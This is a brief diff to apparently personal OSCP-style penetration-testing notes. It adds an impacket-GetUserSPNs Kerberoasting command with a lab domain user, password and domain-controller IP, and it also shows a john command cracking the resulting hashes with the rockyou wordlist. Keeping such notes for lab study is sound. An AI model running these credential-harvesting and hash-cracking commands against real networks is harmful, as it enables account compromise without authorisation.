@@ -38,6 +38,9 @@ const command = `impacket-GetUserSPNs -request -dc-ip ${ip} ${discoveredDomain}/
 dv.paragraph("```bash\n" + command + "\n```");
 
 ```
+```
+impacket-GetUserSPNs 'oscp.exam/Eric.Wallows:Password' -dc-ip 10.10.162.152 -request
+```
 
 ```
 john -w=/usr/share/wordlists/rockyou.txt hash.txt
